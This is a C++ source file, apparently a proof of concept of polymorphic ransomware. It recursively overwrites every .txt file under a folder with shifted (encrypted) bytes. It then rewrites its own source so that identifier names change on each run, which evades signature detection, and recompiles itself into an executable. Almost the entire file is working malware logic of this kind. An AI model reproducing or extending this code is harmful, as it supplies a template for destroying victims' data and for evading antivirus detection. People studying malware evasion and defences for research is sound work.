#include <fstream>
#include <string>
#include <iostream>
#include <vector>
#include <windows.h>
#include <ctime>
#include <dirent.h>

using namespace std;

void name_encryptdata_(const char*  path , int key);
void name_mutate_(string path);
void name_processdirectory_(const char* path, int key);
void makeexe(const char* path);


// A vector of random words
vector<string> name_randomWords_ = {
    "byte", "bit", "code", "qubit", "data" , "IDE" , "API" , "ip" , "ram"
};

// Function to modify variable or function names based on naming convention
string name_modifyName_(const string& name, const string& randomWord) {
    if (name.find("\"") != std::string::npos) {
        return name;
    }
    return name + randomWord;
}


int main()
{
    name_encryptdata_("Folder1" ,  3);
    name_mutate_("polymorphic.cpp");
    makeexe("Polymorphic"); 
    return 0;
}


void name_mutate_(string path){
    srand(static_cast<unsigned int>(time(nullptr))); // Seed the random number generator

    // Load the original program source code
    ifstream name_originalFile_(path);
    string name_originalCode_((istreambuf_iterator<char>(name_originalFile_)), istreambuf_iterator<char>());
    name_originalFile_.close();

    // Select a random word from the vector
    string name_randomWord_ = name_randomWords_[rand() % name_randomWords_.size()];

    // Function to modify variable or function names
    auto modifyNameFunc = [&](string name) {
        return name_modifyName_(name, name_randomWord_);
    };


    // Find and replace variable and function names using modifyNameFunc
    size_t name_pos_ = name_originalCode_.find("name_");
    while (name_pos_ != string::npos) {

        size_t name_sceond_ = name_originalCode_.find("_", name_pos_ + 5);
        if (name_sceond_ != string::npos) {
            size_t name_endPos_ = name_sceond_ ; 
            if (name_endPos_ != string::npos) {
                string name_oldName_ = name_originalCode_.substr(name_pos_, name_endPos_ - name_pos_ + 1);
                string name_newName_ = modifyNameFunc(name_oldName_);
                name_originalCode_.replace(name_pos_, name_endPos_ - name_pos_ + 1, name_newName_);
            }
        }
        name_pos_ = name_originalCode_.find("name_", name_pos_ + 1);
    }

    // Save the modified program source code to a new file
    ofstream name_modifiedFile_(path);
    name_modifiedFile_ << name_originalCode_;
    name_modifiedFile_.close();
    
}


void name_processdirectory_(const char* path, int key) {
    DIR* name_dir_ = opendir(path);
    if (name_dir_ == NULL) {
        cerr << "Error opening directory " << path << endl;
        return;
    }

    struct dirent* name_entry_;
    while ((name_entry_ = readdir(name_dir_)) != NULL) {
        // skip "." and ".." entries
        if (strcmp(name_entry_->d_name, ".") == 0 || strcmp(name_entry_->d_name, "..") == 0) {
            continue;
        }

        // construct the full path of the entry
        string name_full_path_ = string(path) + '/' + name_entry_->d_name;

        // if the entry is a regular file with a .txt extension, process it
        if (name_entry_->d_type == DT_REG 
            && name_full_path_.size() >= 4 
            && name_full_path_.substr(name_full_path_.size() - 4) == ".txt") {
            // read the file into a vector of strings
            ifstream in(name_full_path_);
            string name_line_;
            vector<string> name_lines_;
            while (getline(in, name_line_)) {
                name_lines_.push_back(name_line_);
            }
            in.close();

            // Output encrypted data into the file
            ofstream out(name_full_path_);
            char c;
            for (int i = 0; i < name_lines_.size(); i++) {
                for (int j = 0; j < name_lines_[i].size(); j++) {
                    c = name_lines_[i][j];
                    //check if c is a space or a new line  
                    if(c == ' ' ){
                        out.put(c);
                    }
                    else{
                        out.put(c + key);
                    }
                    
                }
                out.put('\n');
            }
            out.close();
        }
        // if the entry is a directory, recursively process it
        else if (name_entry_->d_type == DT_DIR) {
            name_processdirectory_(name_full_path_.c_str(), key);
        }
    }
    closedir(name_dir_);
}

void name_encryptdata_(const char* path , int key)
{
    name_processdirectory_(path ,  key);
}

void makeexe(const char*  path){
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // Command-line arguments
    char cmdLine[256]; // Adjust the size as needed

    //concatination
    sprintf(cmdLine, "g++ -w %s.cpp -o %s.exe", path , path);
    //g++ -w Polymorphic.cpp -o Polymorphic.exe


    // create the process
    BOOL success = CreateProcessA(
        NULL,
        cmdLine,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,
        NULL,
        NULL,
        &si,
        &pi
    );

    if (!success) {
        std::cerr << "Error creating process" << std::endl;
        return ;
    }

    // resume the process
    ResumeThread(pi.hThread);

    // wait for the process to finish
    WaitForSingleObject(pi.hProcess, INFINITE);

    // close the handles
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    exit(0);
}
